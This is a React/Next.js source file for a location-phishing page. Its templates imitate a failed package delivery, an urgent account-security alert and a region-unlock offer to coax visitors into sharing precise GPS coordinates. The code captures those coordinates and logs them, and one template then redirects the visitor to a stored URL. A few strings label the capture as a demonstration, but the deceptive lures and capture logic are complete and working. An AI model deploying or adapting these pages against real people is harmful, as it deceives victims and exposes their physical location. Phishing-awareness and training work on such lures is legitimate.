
"use client";
import { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { LocationData } from '@/types';
import { Button } from '@/components/ui/button';
import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card'; 
import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, type LucideIcon, Truck } from 'lucide-react';

interface TemplateContent {
  title: string;
  actionText: string;
  message: string; 
  heroIcon?: LucideIcon;
  pageSpecificMessage?: string; 
}

const templateContent: Record<string, TemplateContent> = {
  'package-delivery-issue': {
    title: 'Action Required: Package Delivery Issue',
    actionText: 'Verify Delivery Address & Reschedule',
    message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery.",
    pageSpecificMessage: "Our system indicates a recent delivery attempt for package **#TZ78391B** was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
    heroIcon: Truck,
  },
  'security-alert': {
    title: 'Urgent: Account Security Action Required',
    actionText: 'Verify Location & Secure Account',
    message: "We've detected unusual activity on your account. To protect your account, please verify your current location.",
    pageSpecificMessage: "Verifying your location is a crucial step to ensure your account remains secure. This is a standard security measure.",
    heroIcon: ShieldAlert,
  },
  'content-unlock': {
    title: 'Unlock Exclusive Local Content',
    actionText: 'Verify Location to Access',
    message: 'this content is blocked in some areas.',
    pageSpecificMessage: "Access videos, images, novels, and other files that are restricted in certain countries. Share your location to confirm you reside in a region where this content is available and not blocked.",
    heroIcon: Lock,
  },
  default: {
    title: 'Location Verification Needed',
    actionText: 'Verify My Location',
    message: 'Please share your location to continue using this service.',
    heroIcon: MapPin,
  }
};

const CONTENT_UNLOCK_REDIRECT_URL_KEY = 'contentUnlockRedirectUrl';

export default function LocationPhishingPage() {
  const { addLog } = useLogs();
  const params = useParams();
  const templateId = typeof params.id === 'string' ? params.id : 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string | undefined>(undefined);
  const [currentTime, setCurrentTime] = useState<string | null>(null);

  useEffect(() => {
    setCurrentTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
  }, []);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  useEffect(() => {
    if (status === 'captured') {
      if (templateId === 'content-unlock') {
        const redirectUrl = localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY);
        if (redirectUrl && redirectUrl.trim() !== '') {
          setStatusMessage("Location verified. Thank you. Now you'll be redirected to the wanted website.");
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 2500); 
        } else {
          setStatusMessage("Location verified. Thank you. This window can now be closed.");
        }
      } else {
        setStatusMessage('Location data successfully captured for demonstration.');
      }
    } else {
      setStatusMessage(undefined);
    }
  }, [status, templateId]);

  const handleLocationRequest = () => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser.');
      setStatus('error');
      addLog({ type: 'generic', data: { message: 'Geolocation not supported' } });
      return;
    }

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };
        
        addLog({ type: 'location', data: locationData });
        setStatus('captured');
        setIsLoading(false);
      },
      (err) => {
        let errorMessage = 'Unknown error occurred.';
        switch (err.code) {
          case err.PERMISSION_DENIED:
            errorMessage = 'Location access denied by user.';
            break;
          case err.POSITION_UNAVAILABLE:
            errorMessage = 'Location information is unavailable.';
            break;
          case err.TIMEOUT:
            errorMessage = 'The request to get user location timed out.';
            break;
        }
        setError(errorMessage);
        setStatus('error');
        addLog({ type: 'generic', data: { message: `Location error: ${errorMessage}` } });
        setIsLoading(false);
      },
      { timeout: 10000, enableHighAccuracy: true }
    );
  };

  const renderTemplateSpecificContent = () => {
    const HeroIcon = content.heroIcon || MapPin;
    switch (templateId) {
      case 'package-delivery-issue':
        return (
          <ShadcnCard className="mb-6 p-6 shadow-lg border-primary/30">
            <CardHeader className="p-0 pb-4 text-center">
              <HeroIcon className="w-16 h-16 text-primary mx-auto mb-3" />
              <ShadcnCardTitle className="text-xl font-semibold text-primary">{content.title}</ShadcnCardTitle>
            </CardHeader>
            <CardContent className="p-0 text-center space-y-4">
              <ShadcnCardDescription className="text-md text-muted-foreground">{content.message}</ShadcnCardDescription>
              
              <ShadcnCard className="bg-muted/50 p-4 rounded-md border text-left">
                <ShadcnCardTitle className="text-md font-medium mb-2 text-foreground">Package Details:</ShadcnCardTitle>
                <p className="text-sm"><strong>Tracking Number:</strong> TZ78391B</p>
                <p className="text-sm"><strong>Status:</strong> <span className="text-destructive font-semibold">Delivery Attempt Failed</span></p>
                <p className="text-sm"><strong>Reported:</strong> {currentTime || 'Loading time...'}</p>
              </ShadcnCard>
              <p className="text-sm text-muted-foreground pt-2 !mt-6">{content.pageSpecificMessage}</p>
            </CardContent>
          </ShadcnCard>
        );
      case 'security-alert':
        return (
          <Alert variant="destructive" className="mb-6 text-left p-6 shadow-lg">
            <div className="flex items-center mb-2">
              <HeroIcon className="h-8 w-8 mr-3 text-destructive-foreground" />
              <AlertTitle className="text-xl font-semibold text-destructive-foreground">{content.title}</AlertTitle>
            </div>
            <AlertDescription className="text-md text-destructive-foreground/90">
              {content.pageSpecificMessage || content.message}
            </AlertDescription>
          </Alert>
        );
      case 'content-unlock':
        return (
          <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
            <CardContent className="space-y-4">
              <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
              <ShadcnCardDescription className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardDescription>
              <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
            </CardContent>
          </ShadcnCard>
        );
      default:
        return (
          <div className="text-center space-y-4">
            <HeroIcon className="w-16 h-16 text-primary mx-auto" />
            <p className="text-xl text-muted-foreground">{content.message}</p>
          </div>
        );
    }
  };

  return (
    <PhishingPageLayout 
        title={templateId === 'package-delivery-issue' ? '' : content.title} 
        isLoading={isLoading && status !== 'captured'}
        error={error}
        statusMessage={statusMessage}
    >
      <div className="space-y-6">
        {renderTemplateSpecificContent()}

        {status !== 'captured' && (
          <Button 
            onClick={handleLocationRequest} 
            size="lg"
            className={`w-full text-lg py-6 shadow-md ${
              templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground' 
              : 'bg-accent hover:bg-accent/90 text-accent-foreground'
            }`}
            disabled={isLoading || status === 'requesting'}
          >
            <MapPin className="mr-2 h-6 w-6" />
            {isLoading ? 'Verifying...' : content.actionText}
          </Button>
        )}

        {status === 'captured' && (
          <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
            <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
            <p className="text-xl font-semibold text-green-700">
              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
                ? "Location verified. Thank you. Now you'll be redirected to the wanted website."
                : "Location Verified (Simulated)"}
            </p>
            <p className="text-md text-green-600">
              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
                ? "Please wait."
                : "Thank you. This window can now be closed."}
            </p>
          </div>
        )}
        {status === 'error' && error && (
          <Alert variant="destructive" className="mt-6">
            <AlertTriangle className="h-5 w-5" />
            <AlertTitle>Location Access Failed</AlertTitle>
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}
      </div>
    </PhishingPageLayout>
  );
}

